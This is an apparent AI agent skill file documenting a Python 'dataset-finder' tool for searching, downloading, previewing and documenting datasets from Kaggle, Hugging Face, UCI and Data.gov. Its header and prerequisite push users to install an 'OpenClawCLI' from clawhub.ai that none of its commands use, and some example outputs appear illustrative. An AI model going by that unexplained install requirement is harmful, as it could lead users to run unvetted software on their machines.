---
name: dataset-finder
description: "Use this skill when users need to search for datasets, download data files, or explore data repositories. Triggers include: requests to \"find datasets\", \"search for data\", \"download dataset from Kaggle\", \"get data from Hugging Face\", \"find ML datasets\", or mentions of data repositories like Kaggle, UCI ML Repository, Data.gov, or Hugging Face. Also use for previewing dataset statistics, generating data cards, or discovering datasets for machine learning projects. Requires OpenClawCLI installation from clawhub.ai."
license: Proprietary
---

# Dataset Finder

Search, download, and explore datasets from multiple repositories including Kaggle, Hugging Face, UCI ML Repository, and Data.gov. Preview statistics, generate data cards, and manage datasets for machine learning projects.

⚠️ **Prerequisite:** Install [OpenClawCLI](https://clawhub.ai/) (Windows, MacOS)

**Installation:**
```bash
# Standard installation
pip install kaggle datasets pandas huggingface-hub requests beautifulsoup4

# If you encounter permission errors, use a virtual environment
python -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate
pip install kaggle datasets pandas huggingface-hub requests beautifulsoup4
```

**Never use `--break-system-packages`** as it can damage your system's Python installation.

---

## Quick Reference

| Task | Command |
|------|---------|
| Search Kaggle | `python scripts/dataset.py kaggle search "housing prices"` |
| Download Kaggle dataset | `python scripts/dataset.py kaggle download "username/dataset-name"` |
| Search Hugging Face | `python scripts/dataset.py huggingface search "sentiment"` |
| Download HF dataset | `python scripts/dataset.py huggingface download "dataset-name"` |
| Search UCI ML | `python scripts/dataset.py uci search "classification"` |
| Preview dataset | `python scripts/dataset.py preview dataset.csv` |
| Generate data card | `python scripts/dataset.py datacard dataset.csv --output README.md` |
| List local datasets | `python scripts/dataset.py list` |

---

## Core Features

### 1. Multi-Repository Search

Search across multiple data repositories from a single interface.

**Supported Sources:**
- **Kaggle** - ML competitions and community datasets
- **Hugging Face** - NLP, vision, and audio datasets
- **UCI ML Repository** - Classic ML datasets
- **Data.gov** - US government open data
- **Local** - Manage downloaded datasets

### 2. Dataset Download

Download datasets with automatic format detection.

**Supported formats:**
- CSV, TSV
- JSON, JSONL
- Parquet
- Excel (XLSX, XLS)
- ZIP archives
- HDF5
- Feather

### 3. Dataset Preview

Get quick statistics and insights without loading entire datasets.

**Preview features:**
- Shape (rows × columns)
- Column names and types
- Missing value counts
- Basic statistics (mean, std, min, max)
- Memory usage
- Sample rows

### 4. Data Card Generation

Automatically generate dataset documentation.

**Includes:**
- Dataset description
- Schema information
- Statistics summary
- Usage examples
- License information
- Citation details

---

## Repository-Specific Commands

### Kaggle

Search and download datasets from Kaggle.

**Setup:**
1. Get Kaggle API credentials from https://www.kaggle.com/settings
2. Place `kaggle.json` in `~/.kaggle/` (Linux/Mac) or `%USERPROFILE%\.kaggle\` (Windows)

```bash
# Search datasets
python scripts/dataset.py kaggle search "house prices"

# Search with filters
python scripts/dataset.py kaggle search "NLP" --file-type csv --sort-by hotness

# Download dataset
python scripts/dataset.py kaggle download "zillow/zecon"

# Download specific files
python scripts/dataset.py kaggle download "username/dataset" --file "train.csv"

# List dataset files
python scripts/dataset.py kaggle list "username/dataset-name"
```

**Search options:**
- `--file-type` - Filter by file type (csv, json, etc.)
- `--license` - Filter by license type
- `--sort-by` - Sort by hotness, votes, updated, or relevance
- `--max-results` - Limit number of results

**Output:**
```
1. House Prices - Advanced Regression Techniques
   Owner: zillow/zecon
   Size: 1.5 MB
   Last updated: 2023-06-15
   Downloads: 150,000+
   URL: https://www.kaggle.com/datasets/zillow/zecon

2. Housing Prices Dataset
   Owner: username/housing-data
   Size: 850 KB
   Last updated: 2023-08-20
   Downloads: 50,000+
   URL: https://www.kaggle.com/datasets/username/housing-data
```

### Hugging Face Datasets

Search and download datasets from Hugging Face Hub.

```bash
# Search datasets
python scripts/dataset.py huggingface search "sentiment analysis"

# Search with filters
python scripts/dataset.py huggingface search "NLP" --task text-classification --language en

# Download dataset
python scripts/dataset.py huggingface download "imdb"

# Download specific split
python scripts/dataset.py huggingface download "imdb" --split train

# Download specific configuration
python scripts/dataset.py huggingface download "glue" --config mrpc

# Stream large datasets
python scripts/dataset.py huggingface download "large-dataset" --streaming
```

**Search options:**
- `--task` - Filter by task (text-classification, translation, etc.)
- `--language` - Filter by language code
- `--multimodal` - Include multimodal datasets
- `--benchmark` - Only benchmark datasets
- `--max-results` - Limit results

**Output:**
```
1. IMDB Movie Reviews
   Dataset ID: imdb
   Tasks: sentiment-classification
   Languages: en
   Size: 84.1 MB
   Downloads: 1M+
   URL: https://huggingface.co/datasets/imdb

2. Stanford Sentiment Treebank
   Dataset ID: sst2
   Tasks: sentiment-classification
   Languages: en
   Size: 7.4 MB
   Downloads: 500K+
   URL: https://huggingface.co/datasets/sst2
```

### UCI ML Repository

Search and download classic ML datasets.

```bash
# Search datasets
python scripts/dataset.py uci search "classification"

# Search by characteristics
python scripts/dataset.py uci search "regression" --min-samples 1000

# Download dataset
python scripts/dataset.py uci download "iris"

# Download with metadata
python scripts/dataset.py uci download "wine-quality" --include-metadata
```

**Search options:**
- `--task-type` - classification, regression, clustering
- `--min-samples` - Minimum number of instances
- `--min-features` - Minimum number of features
- `--data-type` - tabular, text, image, time-series

**Output:**
```
1. Iris Dataset
   ID: iris
   Task: classification
   Samples: 150
   Features: 4
   Classes: 3
   Missing values: No
   URL: https://archive.ics.uci.edu/ml/datasets/iris

2. Wine Quality
   ID: wine-quality
   Task: classification/regression
   Samples: 6497
   Features: 11
   Missing values: No
   URL: https://archive.ics.uci.edu/ml/datasets/wine+quality
```

### Data.gov

Search US government open data.

```bash
# Search datasets
python scripts/dataset.py datagov search "census"

# Search with organization filter
python scripts/dataset.py datagov search "health" --organization "cdc.gov"

# Search by topic
python scripts/dataset.py datagov search "education" --tags "schools,students"

# Download dataset
python scripts/dataset.py datagov download "dataset-id"
```

**Search options:**
- `--organization` - Filter by publishing organization
- `--tags` - Filter by tags (comma-separated)
- `--format` - Filter by format (csv, json, xml, etc.)
- `--max-results` - Limit results

**Output:**
```
1. 2020 Census Demographic Data
   Organization: census.gov
   Format: CSV
   Size: 125 MB
   Last updated: 2023-01-15
   Tags: census, demographics, population
   URL: https://catalog.data.gov/dataset/...
```

---

## Dataset Management

### Preview Datasets

Get quick insights without loading entire datasets.

```bash
# Basic preview
python scripts/dataset.py preview data.csv

# Detailed statistics
python scripts/dataset.py preview data.csv --detailed

# Custom sample size
python scripts/dataset.py preview data.csv --sample 20

# Multiple files
python scripts/dataset.py preview train.csv test.csv
```

**Output:**
```
Dataset: train.csv
Shape: 1000 rows × 15 columns
Size: 2.5 MB
Memory usage: 120 KB

Columns:
  - id (int64): no missing values
  - name (object): 5 missing values
  - age (int64): no missing values
  - income (float64): 12 missing values
  - category (object): no missing values

Numeric columns statistics:
           age       income
count   1000.0       988.0
mean      35.2     65432.1
std       12.5     25000.0
min       18.0     20000.0
max       75.0    150000.0

Categorical columns:
  - category: 5 unique values
  - name: 995 unique values

Sample (first 5 rows):
   id      name  age    income category
0   1  John Doe   35   65000.0        A
1   2  Jane Doe   28   55000.0        B
2   3  Bob Smith  42   85000.0        A
...
```

### Generate Data Cards

Create standardized dataset documentation.

```bash
# Generate data card
python scripts/dataset.py datacard dataset.csv --output DATACARD.md

# Include statistics
python scripts/dataset.py datacard dataset.csv --include-stats --output README.md

# Custom template
python scripts/dataset.py datacard dataset.csv --template custom_template.md

# Multiple datasets
python scripts/dataset.py datacard train.csv test.csv --output-dir datacards/
```

**Generated data card includes:**
- Dataset description
- File information (size, format, rows, columns)
- Schema (column names, types, descriptions)
- Statistics (distributions, missing values, correlations)
- Sample data
- Usage examples
- License and citation
- Known issues/limitations

**Example output (DATACARD.md):**
```markdown
# Dataset Card: Housing Prices

## Dataset Description
This dataset contains housing prices and features for regression analysis.

## Dataset Information
- **Format:** CSV
- **Size:** 1.2 MB
- **Rows:** 1,460
- **Columns:** 81

## Schema
| Column | Type | Description | Missing |
|--------|------|-------------|---------|
| Id | int64 | Unique identifier | 0 |
| MSSubClass | int64 | Building class | 0 |
| LotArea | int64 | Lot size in sq ft | 0 |
| SalePrice | int64 | Sale price | 0 |
...

## Statistics
- Numerical features: 38
- Categorical features: 43
- Missing values: 19 columns affected
- Target variable: SalePrice (range: $34,900 - $755,000)

## Usage
```python
import pandas as pd
df = pd.read_csv('housing_prices.csv')
```

## License
Creative Commons
```

### List Local Datasets

Manage downloaded datasets.

```bash
# List all datasets
python scripts/dataset.py list

# List with details
python scripts/dataset.py list --detailed

# Filter by source
python scripts/dataset.py list --source kaggle

# Filter by size
python scripts/dataset.py list --min-size 100MB --max-size 1GB
```

**Output:**
```
Local Datasets (5 total, 2.5 GB):

1. zillow/zecon (Kaggle)
   Downloaded: 2024-01-15
   Size: 1.5 MB
   Files: train.csv, test.csv
   Location: datasets/kaggle/zillow/zecon/

2. imdb (Hugging Face)
   Downloaded: 2024-01-20
   Size: 84.1 MB
   Splits: train, test, unsupervised
   Location: datasets/huggingface/imdb/

3. iris (UCI ML)
   Downloaded: 2024-01-18
   Size: 4.5 KB
   Files: iris.data, iris.names
   Location: datasets/uci/iris/
```

---

## Common Workflows

### Machine Learning Project Setup

Find and download datasets for a new ML project.

```bash
# Step 1: Search for relevant datasets
python scripts/dataset.py kaggle search "house prices" --max-results 10 --output search_results.json

# Step 2: Download selected dataset
python scripts/dataset.py kaggle download "zillow/zecon"

# Step 3: Preview the data
python scripts/dataset.py preview datasets/kaggle/zillow/zecon/train.csv --detailed

# Step 4: Generate documentation
python scripts/dataset.py datacard datasets/kaggle/zillow/zecon/train.csv --output DATACARD.md
```

### NLP Project Dataset Collection

Gather text datasets for NLP tasks.

```bash
# Search Hugging Face for sentiment datasets
python scripts/dataset.py huggingface search "sentiment" --task text-classification --language en

# Download multiple datasets
python scripts/dataset.py huggingface download "imdb"
python scripts/dataset.py huggingface download "sst2"
python scripts/dataset.py huggingface download "yelp_polarity"

# Preview each dataset
python scripts/dataset.py list --source huggingface
```

### Dataset Comparison

Compare multiple datasets for selection.

```bash
# Search across repositories
python scripts/dataset.py kaggle search "titanic" --output kaggle_results.json
python scripts/dataset.py uci search "classification" --output uci_results.json

# Preview candidates
python scripts/dataset.py preview candidate1.csv --output stats1.txt
python scripts/dataset.py preview candidate2.csv --output stats2.txt

# Generate comparison data cards
python scripts/dataset.py datacard candidate1.csv candidate2.csv --output-dir comparison/
```

### Building a Dataset Library

Organize datasets for team use.

```bash
# Create organized structure
mkdir -p datasets/{kaggle,huggingface,uci,custom}

# Download datasets with metadata
python scripts/dataset.py kaggle download "dataset1" --output-dir datasets/kaggle/
python scripts/dataset.py huggingface download "dataset2" --output-dir datasets/huggingface/

# Generate data cards for all
python scripts/dataset.py datacard datasets/**/*.csv --output-dir datacards/

# Create inventory
python scripts/dataset.py list --detailed --output inventory.json
```

### Data Quality Assessment

Assess dataset quality before use.

```bash
# Preview with detailed statistics
python scripts/dataset.py preview dataset.csv --detailed --output quality_report.txt

# Check for issues
python scripts/dataset.py validate dataset.csv --check-missing --check-duplicates --check-outliers

# Generate comprehensive data card
python scripts/dataset.py datacard dataset.csv --include-stats --include-quality --output QA_REPORT.md
```

---

## Advanced Features

### Batch Download

Download multiple datasets at once.

```bash
# Create download list
cat > datasets.txt << EOF
kaggle:zillow/zecon
kaggle:username/housing
huggingface:imdb
uci:iris
EOF

# Batch download
python scripts/dataset.py batch-download datasets.txt --output-dir datasets/
```

### Dataset Conversion

Convert between formats.

```bash
# CSV to Parquet
python scripts/dataset.py convert data.csv --format parquet --output data.parquet

# Excel to CSV
python scripts/dataset.py convert data.xlsx --format csv --output data.csv

# JSON to CSV
python scripts/dataset.py convert data.json --format csv --output data.csv
```

### Dataset Splitting

Split datasets for ML workflows.

```bash
# Train/test split
python scripts/dataset.py split data.csv --train 0.8 --test 0.2

# Train/val/test split
python scripts/dataset.py split data.csv --train 0.7 --val 0.15 --test 0.15

# Stratified split
python scripts/dataset.py split data.csv --stratify target_column --train 0.8 --test 0.2
```

### Dataset Merging

Combine multiple datasets.

```bash
# Concatenate datasets
python scripts/dataset.py merge file1.csv file2.csv --output combined.csv

# Join on key
python scripts/dataset.py merge left.csv right.csv --on id --how inner --output joined.csv
```

---

## Best Practices

### Search Strategy

1. **Start broad** - Use general keywords first
2. **Refine iteratively** - Add filters based on results
3. **Check multiple sources** - Different repositories have different strengths
4. **Review metadata** - Check size, format, license before downloading

### Download Management

1. **Check size first** - Use search to see dataset size
2. **Preview before download** - When possible, preview samples
3. **Organize by source** - Keep repository structure clear
4. **Track downloads** - Use list command to manage local datasets

### Data Quality

1. **Always preview** - Check data before using
2. **Generate data cards** - Document all datasets
3. **Validate data** - Check for missing values, outliers
4. **Keep metadata** - Save original descriptions and licenses

### Storage

1. **Use version control** - Track dataset versions
2. **Compress when possible** - Use Parquet or HDF5 for large datasets
3. **Clean regularly** - Remove unused datasets
4. **Backup important data** - Keep copies of critical datasets

---

## Troubleshooting

### Installation Issues

**"Missing required dependency"**
```bash
# Install all dependencies
pip install kaggle datasets pandas huggingface-hub requests beautifulsoup4

# Or use virtual environment
python -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

**"Kaggle API credentials not found"**
1. Go to https://www.kaggle.com/settings
2. Click "Create New API Token"
3. Save `kaggle.json` to:
   - Linux/Mac: `~/.kaggle/`
   - Windows: `%USERPROFILE%\.kaggle\`
4. Set permissions: `chmod 600 ~/.kaggle/kaggle.json`

**"Hugging Face authentication required"**
```bash
# Login to Hugging Face
huggingface-cli login

# Or set token
export HF_TOKEN="your_token_here"
```

### Search Issues

**"No results found"**
- Try broader search terms
- Remove restrictive filters
- Check spelling
- Try different repository

**"Search timeout"**
- Check internet connection
- Repository may be down temporarily
- Try again in a few minutes

### Download Issues

**"Download failed"**
- Check internet connection
- Verify dataset still exists
- Check available disk space
- Try downloading specific files

**"Permission denied"**
- Some datasets require accepting terms
- May need API credentials
- Check dataset license

**"Out of memory"**
- Use streaming for large datasets
- Download in chunks
- Use Parquet instead of CSV

### Preview Issues

**"Cannot load dataset"**
- Check file format
- Verify file is not corrupted
- Try specifying encoding: `--encoding utf-8`

**"Preview too slow"**
- Use smaller sample size
- Preview first N rows only
- Use format-specific tools

---

## Command Reference

```bash
python scripts/dataset.py <command> [OPTIONS]

COMMANDS:
  kaggle              Kaggle operations (search, download, list)
  huggingface         Hugging Face operations
  uci                 UCI ML Repository operations
  datagov             Data.gov operations
  preview             Preview dataset statistics
  datacard            Generate dataset documentation
  list                List local datasets
  batch-download      Download multiple datasets
  convert             Convert dataset formats
  split               Split dataset for ML
  merge               Combine datasets

KAGGLE:
  search QUERY        Search Kaggle datasets
    --file-type       Filter by file type
    --license         Filter by license
    --sort-by         Sort results
    --max-results     Limit results
  
  download DATASET    Download Kaggle dataset
    --file            Download specific file
    --output-dir      Output directory

HUGGING FACE:
  search QUERY        Search HF datasets
    --task            Filter by task
    --language        Filter by language
    --max-results     Limit results
  
  download DATASET    Download HF dataset
    --split           Specific split
    --config          Configuration
    --streaming       Stream large datasets

UCI:
  search QUERY        Search UCI datasets
    --task-type       Filter by task
    --min-samples     Minimum samples
  
  download DATASET    Download UCI dataset

PREVIEW:
  preview FILE        Preview dataset
    --detailed        Detailed statistics
    --sample N        Sample size

DATACARD:
  datacard FILE       Generate data card
    --output          Output file
    --include-stats   Include statistics
    --template        Custom template

LIST:
  list                List local datasets
    --detailed        Show details
    --source          Filter by source

HELP:
  --help              Show help
```

---

## Examples by Use Case

### Quick Dataset Search

```bash
# Find housing datasets
python scripts/dataset.py kaggle search "housing"

# Find NLP datasets
python scripts/dataset.py huggingface search "sentiment" --task text-classification

# Find classic ML datasets
python scripts/dataset.py uci search "classification"
```

### Download and Preview

```bash
# Download from Kaggle
python scripts/dataset.py kaggle download "zillow/zecon"

# Preview the data
python scripts/dataset.py preview datasets/kaggle/zillow/zecon/train.csv --detailed

# Generate documentation
python scripts/dataset.py datacard datasets/kaggle/zillow/zecon/train.csv
```

### Multi-Source Search

```bash
# Search all repositories
python scripts/dataset.py kaggle search "titanic" --output kaggle.json
python scripts/dataset.py huggingface search "titanic" --output hf.json
python scripts/dataset.py uci search "classification" --output uci.json

# Compare results
cat kaggle.json hf.json uci.json
```

### Dataset Management

```bash
# List all downloaded datasets
python scripts/dataset.py list --detailed

# Preview multiple datasets
python scripts/dataset.py preview *.csv

# Generate data cards for all
python scripts/dataset.py datacard *.csv --output-dir datacards/
```

---

## Support

For issues or questions:
1. Check this documentation
2. Run `python scripts/dataset.py --help`
3. Verify API credentials are set
4. Check repository-specific documentation

**Resources:**
- OpenClawCLI: https://clawhub.ai/
- Kaggle API: https://github.com/Kaggle/kaggle-api
- Hugging Face Datasets: https://huggingface.co/docs/datasets/
- UCI ML Repository: https://archive.ics.uci.edu/ml/
- Data.gov API: https://www.data.gov/developers/apis